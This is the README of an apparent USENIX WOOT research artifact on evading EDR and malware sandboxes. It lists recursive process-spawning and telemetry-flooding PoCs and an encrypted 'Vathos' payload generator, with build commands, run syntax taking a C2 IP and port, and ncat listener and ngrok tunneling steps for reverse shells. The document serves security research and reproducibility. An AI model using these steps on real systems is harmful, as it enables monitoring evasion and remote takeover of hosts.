# PoC-Evidence-WOOT Artifact

## Overview

This repository contains the research artifact accompanying the accepted paper submitted to USENIX WOOT.

The artifact includes:

- Proof-of-concept (PoC) implementations
- Source code
- Precompiled demonstration binaries
- Sandbox analysis logs
- HAR captures from public malware-analysis platforms
- Reproduction instructions for the vulnerabilities and behaviors discussed in the paper

The repository is intended exclusively for academic research, defensive security evaluation, and artifact reproducibility.

---

## Requested Artifact Evaluation (AE) Badges

This artifact is submitted for the following AE badges:

- Artifact Available
- Artifact Functional
- Results Reproduced

The repository contains all materials necessary to:

- inspect the evidence presented in the paper,
- reproduce the demonstrated behaviors,
- rebuild the included binaries,
- and validate the sandbox observations discussed in the manuscript.

---

## IMPORTANT SAFETY WARNING

> **WARNING**
>
> This repository contains:
> - reverse-shell demonstrations,
> - process-flooding PoCs,
> - recursive process spawning,
> - resource exhaustion demonstrations,
> - telemetry flooding techniques,
> - and binaries that may be flagged by security products.
>
> Although these artifacts are provided strictly for research purposes, several binaries intentionally exhibit malware-like behavior as part of the evaluation methodology described in the paper.

### DO NOT:
- execute binaries on a host operating system,
- run samples on production infrastructure,
- expose test systems to the public Internet,
- execute binaries outside isolated virtual machines or sandbox environments.

### RECOMMENDED EXECUTION ENVIRONMENT

All executable demonstrations should only be evaluated inside:

- isolated virtual machines,
- disposable lab environments,
- offline sandbox infrastructure,
- or intentionally segmented research networks.


| Artifact Component        | Purpose                            | Execution Required | Safety Level      |
| ------------------------- | ---------------------------------- | ------------------ | ----------------- |
| `cape_logs/`              | CAPE execution evidence            | No                 | Safe (read-only)  |
| `cuckoo_logs/`            | Cuckoo execution evidence          | No                 | Safe (read-only)  |
| `har_files/`              | Online sandbox traces              | No                 | Safe (read-only)  |
| `recursive_spawn/`        | Process recursion PoC              | Yes (optional)     | VM-only           |
| `recursive_ps_wazuh/`     | Wazuh telemetry exhaustion + shell | Yes                | High-risk VM-only |
| `recursive_velociraptor/` | Velociraptor pstree failure PoC    | Yes                | VM-only           |
| `vathos_demo/`            | Base payload generation demo       | Yes (optional)     | VM-only           |
| `vathos_eicar/`           | EICAR retrieval variant            | Yes (optional)     | VM-only           |
| `vathos_rev/`             | Reverse-shell variant              | Yes                | High-risk VM-only |


Examples:

```bash
cat cape_logs/report.json | jq .
cat cuckoo_logs/report.json | jq .
file har_files/*.har
```

### Optional Build Verification (SAFE)

Reviewers may verify compilation without executing binaries.

Example:

```bash
x86_64-w64-mingw32-clang --target=x86_64-w64-windows-gnu -O2 onion.c -o test.exe
```

This step validates reproducibility of the binaries without launching them.

### Optional Dynamic Reproduction (UNSAFE / VM ONLY)

Execution of:

- `.exe` files,
- reverse-shell payloads,
- recursive spawning demonstrations,
- or telemetry flooding samples

**MUST ONLY occur inside isolated virtual machines.**

See the per-directory sections below for exact reproduction workflows.

---

## One-Command Smoke Test

The following command performs a non-executing structural verification:

```bash
find . -type f | sort
```

Recommended extended smoke test:

```bash
find . -name "*.json" -exec jq empty {} \; && \
find . -name "*.har" -type f && \
find . -name "*.exe" -type f && \
find . -name "*.c" -type f && \
echo "[+] Artifact structure verified successfully"
```

This command:

- validates JSON syntax,
- verifies expected HAR files exist,
- verifies binaries exist,
- verifies source files exist,
- and avoids executing any payloads.

---
## Artifact–Paper Mapping

The table below maps the paper's main claims and per-product results (Section 5) to the
corresponding artifact subdirectory and recommended reproduction workflow.

### Tested Environments

| Environment                     | Type                 | Version / Commit                     | Artifact Coverage                                  |
| ------------------------------- | -------------------- | ------------------------------------ | -------------------------------------------------- |
| Bitdefender GravityZone EDR     | EDR                  | Proprietary                          | External execution only                            |
| Bitdefender GravityZone Sandbox | Malware sandbox      | Proprietary                          | External execution only                            |
| Malwation Threat Zone           | Malware sandbox      | Cloud                                | External execution only                            |
| CAPEv2                          | Malware sandbox      | Commit `52e4b43`                     | `cape_logs/`, `vathos_demo/`, `recursive_spawn/`   |
| sandbox.pikker.ee               | Malware sandbox      | Open source                          | External execution only                            |
| cuckoo.cert.ee                  | Malware sandbox      | Open source                          | External execution only                            |
| Cuckoo                         | Malware sandbox      | Cuckoo v2.0.7                        | `cuckoo_logs/`, `recursive_spawn/`, `vathos_demo/` |
| Kaspersky EDR                   | EDR                  | Proprietary                          | External execution only                            |
| Microsoft Defender              | EDR                  | Proprietary                          | External execution only                            |
| ANY.RUN                         | Malware sandbox      | Cloud                                | `har_files/`                                       |
| Recorded Future Triage          | Malware sandbox      | Cloud                                | `har_files/`                                       |
| Velociraptor                    | DFIR platform        | 0.74.1 (Go 1.23.2, commit 7e3ae67d3) | `recursive_velociraptor/`                          |
| VirusTotal                      | Multiscan aggregator | Cloud                                | `har_files/`                                       |
| WatchGuard EDR                  | EDR                  | Proprietary                          | External execution only                            |
| Wazuh                           | EDR / SIEM           | 4.12.0-rc1                           | `recursive_ps_wazuh/`                              |
| Hybrid Analysis                 | Malware sandbox      | Cloud                                | `har_files/`                                       |
| OPSWAT MetaDefender             | Malware sandbox      | Cloud                                | `har_files/`                                       |
| Comodo Valkyrie                 | Malware sandbox      | Cloud                                | `har_files/`                                       |


---

## VM / Network Safety Requirements & Dynamic Run Guidelines
### Minimum VM Specifications

Due to the recursive nature of the process-spawning demonstrations, under-resourced VMs
**will crash or become unresponsive** before meaningful results are observable.

| Resource | Minimum | Recommended |
|---|---|---|
| RAM | 4 GB | 8 GB+ |
| CPU cores | 2 | 4 |
| Disk space | 40 GB | 60 GB+ |

**Always take a VM snapshot before any dynamic run.** This allows instant rollback without
reprovisioning the entire environment.

---

**Start with `recursive_spawn.exe`** if you want to validate process-tree behavior without
any reverse-shell component. It is the lowest-risk dynamic test in the artifact.
---

### Stopping & Cleaning Up a Run

Cleanup procedure depends on which platform or tool is under test.
Each platform has its own mechanisms, follow the platform's own documented workflow.
General guidance per category is below.

#### Sandbox Platforms (CAPE, Cuckoo)

These platforms manage task lifecycle automatically. A submitted sample runs within its
configured analysis timeout and terminates on its own. CAPE and Cuckoo will notify you
when analysis is complete. After the run:

1. Retrieve logs and reports from the sandbox web UI.
2. Revert the analysis VM to its clean snapshot via the sandbox's built-in mechanism.
3. Do **not** manually kill sandbox VMs mid-analysis unless the host is at risk — incomplete
   runs produce incomplete logs.

Refer to the CAPE and Cuckoo documentation for snapshot management and task cleanup.

#### Velociraptor

After running `recursive_velociraptor.exe`:

1. Kill the process tree from the Velociraptor server UI by terminating the spawned artifact collection.
2. On the VM, open Task Manager and end any remaining `recursive_velociraptor.exe` processes.
3. Revert the VM to the pre-run snapshot.
4. On the Velociraptor server, cancel or clear the affected hunt/collection.

#### Wazuh

After running `recursive_ps_demo.exe`:

1. If the system is still responsive, kill the process from Task Manager or via:
```powershell
   Stop-Process -Name "recursive_ps_demo" -Force
```
2. Close any active listener on the host.
3. Revert the VM to the pre-run snapshot.
4. On the Wazuh manager, clear or archive the flooded alerts to restore normal agent
   communication. Refer to the Wazuh documentation for alert and agent management.

#### Online / Cloud Platforms (AnyRun, Triage, VirusTotal, etc.)

These platforms run samples in their own isolated infrastructure. No local cleanup is required.
After submission, wait for the analysis report to complete on the platform's side.

#### General Fallback

If a VM becomes unresponsive during any dynamic run:

1. **Do not attempt to recover the running VM.** Force-power it off from the hypervisor.
2. Revert to the pre-run snapshot immediately.
3. Do not copy any files out of an in-progress or crashed VM.
4. Re-run with reduced depth or timeout parameters if the crash occurred before results
   were observable.

---

## Directory Descriptions

### `cape_logs/`

#### Description

Contains static output logs and analysis artifacts generated from the CAPE sandbox environment.

Files include:
- execution logs,
- process traces,
- sandbox reports,
- behavioral observations.

#### Safety

> **SAFE TO INSPECT.**
>
> These files are passive evidence artifacts and are not executable.
> No binaries inside this directory should execute automatically.

---

### `cuckoo_logs/`

#### Description

Contains static analysis outputs generated by the Cuckoo sandbox.

Includes:
- process logs,
- behavioral reports,
- PCAP captures,
- registry traces,
- task metadata,
- JSON analysis outputs.

#### Safety

> **SAFE TO INSPECT.**
>
> These files are passive forensic artifacts.
>
> The included PCAP and JSON files may reference malware-like behavior, suspicious domains, or reverse-shell activity, but they are not themselves executable.

---

### `har_files/`

#### Description

Contains HTTP Archive (HAR) files exported from browser sessions interacting with public malware-analysis and sandbox services.

Platforms include:
- ANY.RUN
- Hybrid Analysis
- Threat.Zone
- Triage
- VirusTotal
- Filescan
- Comodo Valkyrie
- Pikker Sandbox

The HAR files capture:
- HTTP requests,
- responses,
- timing data,
- and browser interaction metadata.

#### Safety

> **SAFE TO INSPECT.**
>
> HAR files are passive browser-export artifacts and are not executable payloads.
> Reviewers should inspect them locally and avoid replaying captured requests against production systems.

---

### `recursive_spawn/`

#### Description

Contains a minimal recursive process-spawning proof of concept.

The implementation recursively spawns child processes to extreme depths:

```c
#define MAX_DEPTH 1000000
```

The purpose of this PoC is to reproduce:
- process-tree explosion,
- stack exhaustion,
- monitoring degradation,
- and telemetry stress conditions discussed in the paper.

**Files:**
- `recursive_spawn.c`
- `recursive_spawn.exe`

#### Safety

> **LOW-RISK BUT VM-ONLY.**
>
> The binary is intentionally designed to exhaust process-management resources and may freeze systems, consume CPU/memory, or destabilize monitoring agents.
>
> **DO NOT RUN ON HOST SYSTEMS.**

---

### `recursive_velociraptor/`

#### Description

Velociraptor-specific recursive process spawning demonstration targeting process-tree collection and monitoring behavior.

**Files:**
- `recursive_spawn.c`
- `recursive_velociraptor.exe`
- `details.txt`

#### Test Environment
- Windows 10 x64 VM
- Velociraptor client installed
- Connected to Velociraptor server
- `Generic.System.Pstree` artifact enabled

#### Execution

```bash
recursive_velociraptor.exe <DEPTH> <SLEEP_MS> <IP> <PORT>
```

**Recommended:**
- `DEPTH`: 5000–10000
- `SLEEP_MS`: 1000–10000

A listener should exist on the specified port. Examples:
- `nc`
- `ncat`
- Metasploit
- custom C2 server

#### Expected Results
- Massive recursive process trees
- Monitoring degradation
- Premature artifact termination
- Resource exhaustion behavior

#### Safety

> **VM-ONLY.**
>
> This sample includes reverse-shell behavior, network communication, and recursive process flooding.
> Use only in isolated lab environments.

---

### `recursive_ps_wazuh/`

#### Description

Custom recursive process-spawning variation targeting Wazuh telemetry and behavioral monitoring.

Features include:
- recursive process spawning,
- PowerShell reverse shell execution,
- `cmd.exe` flooding,
- registry flooding,
- Sysmon/Wazuh event saturation.

**Files:**
- `recursive_ps_demo.c`
- `recursive_ps_demo.exe`
- `details.txt`

#### Execution

```bash
recursive_ps_demo.exe <max_depth> <flood_count> <flood_threads> <ip> <port>
```

**Recommended:**
- `max_depth`: 5000
- `flood_count`: 1000
- `flood_threads`: 10

A listener should be active on the provided port.

#### Expected Results

Observed behaviors include:
- large process-tree generation,
- excessive Sysmon/Wazuh logging,
- stack-overflow crashes,
- WER accumulation,
- monitoring blind spots,
- stealthy reverse-shell execution.

#### Safety

> **HIGH-RISK / VM-ONLY.**
>
> This sample intentionally demonstrates reverse-shell functionality, telemetry flooding, and monitoring evasion behavior.
> Execution outside isolated research infrastructure is strongly discouraged.

---

### `vathos_demo/`

#### Description

Demonstration implementation of the Vathos payload-generation mechanism.

**Files:**
- `encrypt.py`
- `onion.c`
- `vathos_demo.exe`
- `details.txt`

#### Build Instructions

Generate headers:

```bash
python3 encrypt.py -r <rounds> -k <key_length>
```

Compile:

```bash
x86_64-w64-mingw32-clang --target=x86_64-w64-windows-gnu -O2 -Wno-deprecated-declarations onion.c -o vathos_demo.exe -Wl,-subsystem,windows
```

Run:

```bash
vathos_demo.exe <IP> <PORT>
```

#### Safety

> **VM-ONLY.**
>
> Includes network-capable payload behavior.

---

### `vathos_rev/`

#### Description

Reverse-shell oriented Vathos demonstration.

**Files:**
- `encrypt_command.py`
- `onion.c`
- `vathos_rev.exe`
- `details.txt`

#### Build Instructions

Start listener:

```bash
ncat -nvlkp 4444
```

Optional tunneling:

```bash
ngrok tcp 4444
```

Generate headers:

```bash
python3 encrypt_command.py -r <rounds> -k <key_length> -c <C2_IP> -p <C2_PORT>
```

Compile:

```bash
x86_64-w64-mingw32-clang --target=x86_64-w64-windows-gnu -O2 -Wno-deprecated-declarations onion.c -o vathos_rev.exe -Wl,-subsystem,windows
```

Run:

```bash
vathos_rev.exe
```

#### Safety

> **HIGH-RISK / VM-ONLY.**
>
> This sample intentionally performs reverse-shell communication, outbound network connectivity, and command execution behavior.
> Use exclusively in isolated research environments.

---

### `vathos_eicar/`

#### Description

Vathos demonstration configured to retrieve the EICAR test payload.

**Files:**
- `encrypt_url.py`
- `onion.c`
- `vathos.exe`
- `details.txt`

#### Build Instructions

Modify rounds, key length, and URL inside `encrypt_url.py`.

Generate headers:

```bash
python3 encrypt_url.py
```

Compile:

```bash
x86_64-w64-mingw32-clang --target=x86_64-w64-windows-gnu -O2 -Wno-deprecated-declarations onion.c -o vathos_eicar.exe -Wl,-subsystem,windows
```

Run:

```bash
vathos_eicar.exe
```

#### Safety

> **VM-ONLY.**
>
> Although this variant targets the EICAR test artifact, it still demonstrates network-enabled payload behavior.

---

## Dependencies

**Recommended tooling:**
- `python3`
- `jq`
- `tree`
- `sha256sum`
- `clang`
- `mingw-w64`
- `x86_64-w64-mingw32-clang`

**Recommended OS:**
- Ubuntu 22.04+
- Windows 10 x64 VMs for runtime testing

---

## Known Issues / Notes

- All dynamic demonstrations are intentionally noisy and may trigger antivirus products.
- Some samples intentionally generate stack overflows, process floods, excessive telemetry, reverse-shell activity, and monitoring instability.

---


